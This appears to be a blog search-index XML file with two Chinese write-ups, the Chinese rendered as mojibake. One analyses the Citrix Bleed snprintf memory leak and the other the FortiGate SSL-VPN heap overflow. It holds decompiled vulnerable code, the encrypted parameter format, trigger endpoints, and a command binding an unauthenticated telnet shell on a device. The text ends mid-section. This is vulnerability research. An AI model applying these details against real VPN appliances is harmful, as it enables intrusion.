<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2023-4966 citrix  å†…å­˜æ³„æ¼</title>
      <link href="CVE-2023-4966-Citrix-memory-leak.html"/>
      <url>CVE-2023-4966-Citrix-memory-leak.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>10æœˆ18æ—¥çš„æ—¶å€™æ³¨æ„åˆ°æ€æ°å®˜ç½‘å‘å¸ƒäº†ä¸€ä¸ªå®‰å…¨å…¬å‘Š: <a href="https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967">NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966 and CVE-2023-4967</a> ã€‚å…¶ä¸­æåˆ°ä¸€ä¸ªæ•æ„Ÿä¿¡æ¯æ³„éœ²çš„æ¼æ´ã€‚åœ¨ä»Šå¤©ï¼ˆ10æœˆ24æ—¥ï¼‰ï¼Œassetnote å‘å¸ƒäº†ä¸€äº›ç»†èŠ‚æ–‡ç« ï¼Œè¿™é‡Œç®€å•è®°å½•ä¸‹ã€‚</p><h2 id="æ¼æ´ç»†èŠ‚"><a href="#æ¼æ´ç»†èŠ‚" class="headerlink" title="æ¼æ´ç»†èŠ‚"></a>æ¼æ´ç»†èŠ‚</h2><p>è¿™é‡Œä»¥ 13.0-47 çš„å›ºä»¶ä¸ºä¾‹å­ï¼Œ ä»å›ºä»¶æ‹‰å‡º nsppe è¿™ä¸ªç¨‹åºï¼Œç”¨ IDA æ‰“å¼€åˆ†æã€‚ æœç´¢æ–‡ç« æåˆ°çš„å­—ç¬¦ä¸²å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  want_to_write_len = <span class="built_in">snprintf</span>(</span><br><span class="line">                        print_temp_rule,</span><br><span class="line">                        <span class="number">0x10000</span>,</span><br><span class="line">                        (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;&#123;\&quot;issuer\&quot;: \&quot;https://%.*s\&quot;, \&quot;authorization_endpoint\&quot;: \&quot;https://%.*s/oauth/id&quot;</span></span><br><span class="line">                                      <span class="string">&quot;p/login\&quot;, \&quot;token_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/token\&quot;, \&quot;jwks_uri\&quot;: \&quot;h&quot;</span></span><br><span class="line">                                      <span class="string">&quot;ttps://%.*s/oauth/idp/certs\&quot;, \&quot;response_types_supported\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;,&quot;</span></span><br><span class="line">                                      <span class="string">&quot; \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_sess&quot;</span></span><br><span class="line">                                      <span class="string">&quot;ion_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/logout\&quot;, \&quot;frontchannel_logout_supported&quot;</span></span><br><span class="line">                                      <span class="string">&quot;\&quot;: true, \&quot;scopes_supported\&quot;: [\&quot;openid\&quot;, \&quot;ctxs_cc\&quot;], \&quot;claims_supported\&quot;: [&quot;</span></span><br><span class="line">                                      <span class="string">&quot;\&quot;sub\&quot;, \&quot;iss\&quot;, \&quot;aud\&quot;, \&quot;exp\&quot;, \&quot;iat\&quot;, \&quot;auth_time\&quot;, \&quot;acr\&quot;, \&quot;amr\&quot;, \&quot;em&quot;</span></span><br><span class="line">                                      <span class="string">&quot;ail\&quot;, \&quot;given_name\&quot;, \&quot;family_name\&quot;, \&quot;nickname\&quot;], \&quot;userinfo_endpoint\&quot;: \&quot;ht&quot;</span></span><br><span class="line">                                      <span class="string">&quot;tps://%.*s/oauth/idp/userinfo\&quot;&#125;&quot;</span>,</span><br><span class="line">......</span><br><span class="line">                        hostname);</span><br><span class="line">  authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ns_vpn_send_response(a1, <span class="number">0x100040</span>LL, print_temp_rule, want_to_write_len) )</span><br><span class="line">  &#123;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œsnprintfå‡½æ•°è¢«ç”¨äºå°†hostnameå‚æ•°æ‹¼æ¥åˆ°print_temp_ruleå˜é‡ä¸­ï¼Œå¹¶æ ¹æ®è¿”å›çš„é•¿åº¦ï¼Œé€šè¿‡ns_vpn_send_responseå‡½æ•°è¿”å›HTTPè¯·æ±‚çš„ç»“æœã€‚è¿™ç§å¯¹snprintfçš„ä½¿ç”¨æ–¹æ³•æ˜¯ä¸€ä¸ªå¸¸è§çš„é”™è¯¯ã€‚è¿™é‡Œçš„hostnameå‚æ•°æ˜¯ç”± HTTP è¯·æ±‚ä¸­çš„ Host å¤´å†³å®šçš„,å› æ­¤è¿™ä¸ªå‚æ•°çš„é•¿åº¦æˆ‘ä»¬æ˜¯å®Œå…¨å¯ä»¥æ§åˆ¶çš„ã€‚è¿™è®©æˆ‘æƒ³åˆ°ä¸€ä¸ªé•¿äº­ä¹‹å‰å‘å¸ƒçš„ä¸€ç¯‡ç»å…¸æ–‡ç«  <a href="https://zhuanlan.zhihu.com/p/26271959">å®æˆ˜æ ˆæº¢å‡ºï¼šä¸‰ä¸ªæ¼æ´æå®šä¸€å°è·¯ç”±å™¨</a>ã€‚ä¹Ÿæ˜¯ä½¿ç”¨snprintf ä»ç¼“å†²åŒºæ³„æ¼å†…å­˜ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-2fe3d848035af324ca8bae785143a63e-8711d2.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-2fe3d848035af324ca8bae785143a63e-8711d2.png" alt="image.png"></a></p><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼Œ snprintf è¿™ä¸ªå‡½æ•°åº”è¯¥è¿”å›çš„æ˜¯ â€æƒ³è¦å†™å…¥buffer çš„å­—ç¬¦ä¸²é•¿åº¦â€œ ï¼Œ è€Œä¸æ˜¯å®é™…å†™å…¥bufferçš„å­—ç¬¦é•¿é•¿åº¦ã€‚å¯ä»¥ä»ä¸€ä¸ª DEMO çœ‹å‡ºè¿™ä¸ªæ•ˆæœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">âœ  Desktop cat test.c</span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    char buf[8];</span><br><span class="line">    memset(buf,0,8);</span><br><span class="line">    int n1 = snprintf(buf, 8, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n1: %d\n&quot;</span>, n1);</span><br><span class="line">    memset(buf,0,8);</span><br><span class="line">    int n2 = snprintf(buf, 8, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;aaaabbbbccccdddd&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n2: %d\n&quot;</span>, n2);</span><br><span class="line">&#125;</span><br><span class="line">âœ  Desktop ./a.out</span><br><span class="line">buf: aaa</span><br><span class="line">n1: 3</span><br><span class="line">buf: aaaabbb</span><br><span class="line">n2: 16</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘æƒ³å†™å…¥ 16é•¿åº¦çš„å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ n2çš„å€¼ä¸º 16ï¼Œ è€Œä¸æ˜¯å®é™…å†™å…¥çš„é•¿åº¦ã€‚ </p><blockquote><p>The functions snprintf() and vsnprintf() do not write more than size bytes (including the terminating null byte (â€™\0â€™))</p></blockquote><p>PoCï¼š</p><p>å…·ä½“ä¸€æ ·é•¿åº¦èƒ½ä¸èƒ½æ³„æ¼å‡º token ï¼Œ çœ‹èµ·æ¥å’Œç‰ˆæœ¬è¿˜æ˜¯æœ‰å…³ç³»çš„ï¼Œè‡³å°‘æˆ‘è¿™ä¸ªç‰ˆæœ¬åœ¨ <a href="https://raw.githubusercontent.com/assetnote/exploits/main/citrix/CVE-2023-4966/exploit.py">CVE-2023-4966</a>è¿™ä¸ªåˆ©ç”¨ä¸­æ˜¯æ‰“ä¸å‡ºæ¥çš„ã€‚åº”è¯¥å’Œä¸åŒç¼“å†²åŒºçš„å¤§å°ä¸ä¸€æ ·?çŒœæµ‹çš„,å…·ä½“æˆ‘å°±ä¸è¿›ä¸€æ­¥è°ƒè¯•äº†ã€‚</p><p>å¦å¤–åˆ°è¾¾è¿™ä¸ªå‡½æ•°çš„è·¯ç”±ï¼Œé€šè¿‡å¯¹è¿™ä¸ªå‡½æ•° <code>ns_aaa_oauth_send_openid_config</code> è¿›è¡Œäº¤å‰å¼•ç”¨ä¸€ä¸‹å­å°±çœ‹åˆ°äº†ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-eccaaad8f179b9f13f8bf38ecc9698c8-ca5187.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-eccaaad8f179b9f13f8bf38ecc9698c8-ca5187.png" alt="image.png"></a></p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p><a href="https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966">Citrix Bleed: Leaking Session Tokens with CVE-2023-4966</a><br><a href="https://zhuanlan.zhihu.com/p/26271959">å®æˆ˜æ ˆæº¢å‡ºï¼šä¸‰ä¸ªæ¼æ´æå®šä¸€å°è·¯ç”±å™¨</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2023-4966 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow</title>
      <link href="CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"/>
      <url>CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>ç”±äº<code>CVE-2023-27997</code> æ¼æ´çš„å½±å“æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥æˆ‘ä¸€ç›´æ²¡æœ‰å…¬å¼€è¿™ç¯‡åšå®¢ï¼Œ ä½†æ˜¯è·ç¦»è¯¥æ¼æ´å…¬å¼€å·²ç»å·®ä¸å¤šè¿‡å»äº†ä¸‰ä¸ªæœˆäº†ï¼Œ å…¬ç½‘çš„è®¾å¤‡åº”è¯¥éƒ½ä¿®çš„å·®ä¸å¤šäº†å§ï¼Œ å› æ­¤è¿™é‡Œå¯ä»¥å¤§å®¶åˆ†äº«ä¸€ä¸‹å½“æ—¶æˆ‘å’Œ@leommxj ä¸€èµ·å¤ç°è¯¥æ¼æ´çš„ç¬”è®°ã€‚</p><p>æ›´å…·ä½“çš„æ¼æ´ç»†èŠ‚å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š <a href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">Pre-authentication Remote Code Execution on Fortigate VPN </a>, è€Œæˆ‘è¿™é‡Œåˆ†æç‰ˆæœ¬ä¾æ—§æ˜¯ 7.2.2</p><h2 id="æ¼æ´ç¯å¢ƒæ­å»º"><a href="#æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º"></a>æ¼æ´ç¯å¢ƒæ­å»º</h2><p>å‚è€ƒå¯ä»¥å‚è€ƒæˆ‘ä¸Šä¸€ç¯‡æ–‡ç«  ã€ŠCVE-2022-42475-FortiGate-SSLVPN-HeapOverflowã€‹</p><p>åœ¨è°ƒè¯•çš„æ—¶å€™ ï¼Œ æ‰¾ @leommxj å’Œ @explorer å¸®æˆ‘é…ç½®äº†ç½‘ç»œç¯å¢ƒï¼Œ ä¸€å¼€å§‹ç”¨çš„æ˜¯ gdb + vmware çš„è°ƒè¯•æ–¹æ³•ï¼Œåé¢æ”¹ç”¨ gdbserver + gdb çš„æ–¹æ³•äº†ï¼Œ ç”±äº fortigate çš„é˜²ç«å¢™åŸå› ï¼Œæˆ‘ä»¬å¤ç”¨äº† 22 ç«¯å£ å’Œ23 ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 $(pidof sshd) &amp;&amp; .&#x2F;busybox_TELNETD -b 0.0.0.0:22 -l &#x2F;bin&#x2F;sh</span><br><span class="line">kill -9 $(pidof telnetd) &amp;&amp; .&#x2F;gdbserver 0.0.0.0:23 --attach  $(pidof sslvpnd)</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å½“æˆ‘ä»¬å‘ fortigate sslvpn å‘é€ä¸€ä¸ª <code>enc</code> çš„ HTTP å‚æ•°çš„æ—¶å€™, ä¼šè¿›åˆ°ä¸€ä¸ª <code>parse_enc_data</code> çš„å‡½æ•°é€»è¾‘é‡Œ. </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png" alt="image.png"></a></p><p>å¦å¤–è¿™ä¸ª <code>enc</code> å¤„ç†çš„ URI æœ‰å¾ˆå¤šå¯ä»¥è¿›æ¥, åŒ…æ‹¬ <code>/remote/hostcheck_validate</code>  ä»¥åŠ ^[1] æåˆ°çš„ <code>/remote/logincheck</code> , å…·ä½“ URI çš„é€‰æ‹©,æˆ‘ä»¬åæ–‡æ¥ç€ä¼šæåˆ° ã€‚è¿™é‡Œæ¥ç€åˆ†æ  <code>parse_enc_data</code> å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">parse_enc_data</span><span class="params">(__int64 a1, __int64 *pool, <span class="keyword">const</span> <span class="keyword">char</span> *in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  v30 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(in);                              <span class="comment">// in (enc) : AA BB CC DD  XX XX HACKED HACKED ...</span></span><br><span class="line">                                                <span class="comment">//               SEED      SIZE     CIPHERTEXT</span></span><br><span class="line">  int_len = v4;</span><br><span class="line">  lenOfData = v4;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v4 &lt;= <span class="number">11</span> || (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )         <span class="comment">// enc çš„é•¿åº¦è¦å¤§äº11, ä¸”å¶æ•°</span></span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿›åˆ°å‡½æ•°é‡Œï¼Œ ä¼šå…ˆåˆ¤æ–­ <code>enc</code> å‚æ•°çš„å€¼æ˜¯å¦é•¿åº¦å¤§äº11, ä¸”å¶æ•° ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MD5Data(salt, (__int64)in, <span class="number">8</span>, (__int64)md5);</span><br><span class="line">out = (__int16 *)alignedAlloc(*pool, (int_len &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>å½“ç¬¦åˆè¦æ±‚åï¼Œ ä¼šä»¥é•¿åº¦çš„ 1/2 çš„å¤§å°åˆ†é…ä¸€ä¸ª buffer , ç„¶åä¸­é—´ä¼šç»è¿‡ä¸€äº›æ•°æ®å¤„ç†ï¼Œç„¶ååˆ°è¾¾å¦å¤–ä¸€ä¸ª check</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">out = decodedData_ + <span class="number">2</span>;</span><br><span class="line">xored_given_len = decodedData_[<span class="number">2</span>];</span><br><span class="line">given_len = (<span class="keyword">unsigned</span> __int8)(xored_given_len ^ md5[<span class="number">0</span>]);</span><br><span class="line">BYTE1(given_len) = md5[<span class="number">1</span>] ^ HIBYTE(xored_given_len);</span><br><span class="line">payloadLength = (<span class="keyword">unsigned</span> __int8)(xored_given_len ^ md5[<span class="number">0</span>]);<span class="comment">// æ£€æŸ¥å¤§å°</span></span><br><span class="line"><span class="keyword">if</span> ( int_len - <span class="number">5</span> &lt;= payloadLength )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = decodedData_ + <span class="number">3</span>;</span><br><span class="line">  out = v17;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)xored_given_len != md5[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(payloadLength - <span class="number">1</span>);</span><br><span class="line">    i = <span class="number">0L</span>L;</span><br><span class="line">    v20 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v17 + i) ^= md5[v20];    <span class="comment">// bof</span></span><br><span class="line">      <span class="keyword">if</span> ( v18 == i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v20 = ((_BYTE)i + <span class="number">3</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (((_BYTE)i + <span class="number">3</span>) &amp; <span class="number">0xF</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = out;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = (__int16 *)((<span class="keyword">char</span> *)out + (<span class="keyword">unsigned</span> __int16)given_len);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šå°†æ•°æ®çš„é•¿åº¦ï¼ˆå®é™…ä¼ å…¥çš„é•¿åº¦ ï¼‰ å’Œ <code>enc</code> è¿™ä¸ªå‚æ•°å®šä¹‰çš„ payload çš„é•¿åº¦æ¯”è¾ƒï¼Œ å¦‚æœç¬¦åˆ  <code>int_len - 5 &lt;= payloadLength</code> ï¼Œ å³å®é™…é•¿åº¦å¤§äºå®šä¹‰çš„é•¿åº¦ï¼Œ å³æ¥ç€å¾€ä¸‹èµ°ã€‚ æ³¨æ„è¿™é‡Œä¼šå‡ºç°ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼š</p><p>å› ä¸ºå®é™…åˆ†é…çš„buffer çš„é•¿åº¦åº”è¯¥æ˜¯å®é™…é•¿åº¦çš„ 1/2 ï¼Œè€Œè¿™é‡Œå´æ˜¯ç”¨åŸæ¥çš„é•¿åº¦æ¯”è¾ƒçš„ï¼Œå› æ­¤åé¢ä¼šå‘ç”Ÿæº¢å‡ºã€‚ä½†æ˜¯è¿™é‡Œçš„æº¢å‡ºçš„å­—èŠ‚æ˜¯ä¸€ä¸ª md5 å¼‚æˆ–, è¿™é‡Œä¼šå¯¹æˆ‘ä»¬åé¢çš„åˆ©ç”¨æå‡ºä¸€ç‚¹ç‚¹çš„éš¾åº¦,ä½†æ˜¯ä½œè€…å´ç”¨äº†ä¸€ä¸ªå¾ˆå·§å¦™çš„æ¥å®Œæˆ ã€‚</p><p>è¿™é‡Œç®€å•æ€»ç»“ä¸‹è¿™ä¸ªå‡½æ•°å’Œæç‚¼ä¸‹ <code>enc</code> çš„ç»“æ„, é¦–å…ˆ <code>enc</code> å‚æ•°æ˜¯ä¸€ä¸ªåŒ…å« seedã€sizeï¼ˆ2 ä¸ªå­—èŠ‚ï¼‰å’Œæ•°æ®çš„ç»“æ„ã€‚å¤§å°å’Œæ•°æ®éƒ½æ˜¯åŠ å¯†çš„ã€‚ å¤§è‡´å°±ä¸‹å›¾çš„æ ·å­.</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png" alt="image.png"></a></p><p>seed å­˜å‚¨ä¸º 8 ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ï¼Œç”¨äºè®¡ç®— XOR å¯†é’¥æµçš„ç¬¬ä¸€ä¸ªçŠ¶æ€ï¼š</p><p><code>S0 = MD5(salt|seed| &quot;GCC is the GNU Compiler Collection.&quot;)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MD5Data</span><span class="params">(<span class="keyword">char</span> *salt, __int64 enc, <span class="keyword">int</span> size, __int64 output)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">MD5_Init</span><span class="params">(v8)</span></span>;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(salt);</span><br><span class="line">  MD5_Update(v8, salt, v6);</span><br><span class="line">  MD5_Update(v8, enc, size);</span><br><span class="line">  MD5_Update(v8, <span class="string">&quot;GCC is the GNU Compiler Collection.&quot;</span>, <span class="number">35L</span>L);</span><br><span class="line">  MD5_Final(output, v8);</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0</span>x</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>salt</code> æ˜¯ç”±æœåŠ¡å™¨åˆ›å»ºçš„éšæœºå€¼, å¯ä»¥é€šè¿‡ <code>GET /remote/info HTTP/1.1</code> è·å–åˆ° </p><p>å¯†é’¥æµçš„å…¶ä»–çŠ¶æ€è®¡ç®—å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png" alt="image.png"></a><br>å‡½æ•°è¡Œä¸º:</p><ol><li>è®¡ç®— MD5ï¼ˆ16 å­—èŠ‚ï¼‰ï¼Œè¿™æ˜¯æ¥è‡ªç›å’Œç§å­çš„å¯†é’¥çš„ç¬¬ä¸€ä¸ªçŠ¶æ€ï¼ˆin çš„å‰ 8 ä¸ªå­—ç¬¦ï¼‰</li><li>åˆ†é…å¤§å°ä¸º in_len / 2 + 1ã€out å’Œåå…­è¿›åˆ¶è§£ç è¾“å…¥çš„ç¼“å†²åŒº</li><li>é€šè¿‡å°†æœ‰æ•ˆè´Ÿè½½çš„å‰ä¸¤ä¸ªå­—èŠ‚ä¸å¯†é’¥çš„å‰ä¸¤ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œè®¡ç®—ç”¨æˆ·ç»™å®šçš„é•¿åº¦ given_len</li><li>è¾¹ç•Œæ£€æŸ¥ï¼šéªŒè¯ç»™å®šçš„é•¿åº¦ä¸å¤§äºç¼“å†²åŒºçš„å¤§å°</li><li>å°±åœ°è§£å¯†æ•´ä¸ªå­—ç¬¦ä¸²ï¼šå¯¹å‰ 14 ä¸ªå­—èŠ‚è¿›è¡Œ XORï¼Œç„¶åè®¡ç®—ä¸€ä¸ªæ–°çŠ¶æ€ ğ¾ 1ä¸ª ï¼Œç”¨å®ƒå¯¹æ¥ä¸‹æ¥çš„ 16 ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼Œç„¶åé‡å¤ã€‚</li><li>åœ¨è§£å¯†æ•°æ®çš„æœ«å°¾æ”¾ç½®ä¸€ä¸ª NULL å­—èŠ‚</li><li>å½“ç¨‹åºæ£€æŸ¥ç»™å®šé•¿åº¦ä¸å¤§äºå‘é€çš„æœ‰æ•ˆè´Ÿè½½çš„é•¿åº¦æ—¶ï¼Œå®ƒä¼šå°† in_len ä¸ given_len è¿›è¡Œæ¯”è¾ƒã€‚ä½†æ˜¯ï¼Œå‰è€…ä»¥åå…­è¿›åˆ¶æè¿°æœ‰æ•ˆè´Ÿè½½çš„é•¿åº¦ï¼ˆä¾‹å¦‚â€œ41424343â€ï¼‰ï¼Œè€Œåè€…ä»¥åŸå§‹å­—èŠ‚æè¿°å…¶å¤§å°ï¼ˆä¾‹å¦‚â€œABCDâ€ï¼‰ã€‚å› æ­¤ï¼Œgiven_len å¯ä»¥æ˜¯å®ƒåº”è¯¥çš„ä¸¤å€å¤§ã€‚å› æ­¤é€ æˆäº†æº¢å‡º</li></ol><blockquote><p>è¿™é‡Œç¨å¾®åæ§½ä¸€ä¸‹ï¼Œ IDA çš„åç¼–è¯‘é”™è¯¯å¯¼è‡´å¾ˆå¤šæ–‡ç« å¯¹è¯¥æ¼æ´çš„äº§ç”ŸåŸå› çš„æè¿°æœ‰äº›é”™è¯¯</p><p><a href="https://twitter.com/bestswngs/status/1670709186509045761">wrong results of Hex-Rays</a></p></blockquote><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="åˆ©ç”¨åŸè¯­"><a href="#åˆ©ç”¨åŸè¯­" class="headerlink" title="åˆ©ç”¨åŸè¯­"></a>åˆ©ç”¨åŸè¯­</h3><p>é¦–å…ˆç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯æˆ‘ä»¬æœ€ç»ˆé€‰æ‹©äº†  <code>/remote/hostcheck_validate</code>   æ¥åšæ¼æ´çš„è§¦å‘, ç”±äºæ¼æ´åˆ©ç”¨åŸå› éœ€è¦å¤šæ¬¡è¯·æ±‚, æˆ‘ä»¬å¦‚æœä½¿ç”¨äº† <code>/remote/logincheck</code>  å®¹æ˜“è§¦å‘ <code>login-attempt-limit</code> çš„é™åˆ¶, è¿™ä¸ªé»˜è®¤é™åˆ¶ä¸º 2</p><p><a 